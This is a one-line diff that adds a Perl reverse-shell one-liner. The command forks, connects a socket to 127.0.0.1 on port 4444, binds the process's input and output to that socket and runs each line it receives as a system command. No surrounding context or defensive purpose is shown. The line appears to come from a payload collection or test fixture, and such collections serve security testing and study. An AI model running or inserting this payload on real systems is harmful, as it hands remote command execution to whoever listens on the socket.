@@ -1,0 +1,1 @@
+perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1 :4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
